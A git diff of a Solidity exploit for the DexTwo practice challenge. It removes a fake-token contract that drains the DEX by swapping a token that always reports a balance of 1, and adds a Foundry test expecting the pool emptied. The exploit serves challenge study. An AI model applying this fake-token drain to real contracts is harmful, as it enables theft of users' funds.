@@ -1,24 +1,68 @@
 // SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
 
-pragma solidity ^0.8.10;
-import "./DexTwo.sol";
+import {Test, console2} from "forge-std/Test.sol";
+import {DexTwo, SwappableTokenTwo} from "./DexTwo.sol";
+import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 
-contract DexTwoHack {
-    DexTwo dexTwo;
-    constructor(DexTwo _dexTwo) {
-        dexTwo = _dexTwo;
+contract AttackDexTwoToken is SwappableTokenTwo {
+    constructor(address dexInstance, uint256 initialSupply)
+        SwappableTokenTwo(dexInstance, "Attacker", "AA", initialSupply)
+    {}
+
+    function approveSkipChecks(address owner, address spender, uint256 amount) public {
+        ERC20._approve(owner, spender, amount);
+    }
+}
+
+contract DexTwoTest is Test {
+    DexTwo public dex;
+    SwappableTokenTwo public token1;
+    SwappableTokenTwo public token2;
+
+    address owner;
+
+    function setUp() public {
+        owner = address(0x1);
+
+        vm.startPrank(owner);
+        dex = new DexTwo();
+        token1 = new SwappableTokenTwo(address(dex), "SwappableToken1", "ST1", 110);
+        token2 = new SwappableTokenTwo(address(dex), "SwappableToken2", "ST2", 110);
+
+        assert(token1.balanceOf(owner) == 110);
+        assert(token2.balanceOf(owner) == 110);
+
+        dex.setTokens(address(token1), address(token2));
+
+        token1.transfer(address(dex), 100);
+        token2.transfer(address(dex), 100);
+        token1.transfer(address(this), 10);
+        token2.transfer(address(this), 10);
+
+        assert(token1.balanceOf(owner) == 0);
+        assert(token2.balanceOf(owner) == 0);
+        assert(token1.balanceOf(address(dex)) == 100);
+        assert(token2.balanceOf(address(dex)) == 100);
+        assert(token1.balanceOf(address(this)) == 10);
+        assert(token2.balanceOf(address(this)) == 10);
+
+        vm.stopPrank();
     }
 
-    function balanceOf(address) public view returns(uint balance){
-        balance = 1;
+    function test_Attack_Dex() public {
+        assertEq(token1.balanceOf(address(dex)), 0);
+        assertEq(token2.balanceOf(address(dex)), 0);
+        assertEq(token1.balanceOf(address(this)), 110);
+        assertEq(token2.balanceOf(address(this)), 110);
     }
 
-    function transferFrom(address from, address to, uint amount) public returns(bool) {
-        return true;
+    function swapAForB(uint256 amount) public {
+        dex.swap(address(token1), address(token2), amount);
     }
 
-    function attack() external {
-        dexTwo.swap(address(this), dexTwo.token1(), 1);
-        dexTwo.swap(address(this), dexTwo.token2(), 1);
+    function swapBForA(uint256 amount) public {
+        dex.swap(address(token2), address(token1), amount);
     }
 }
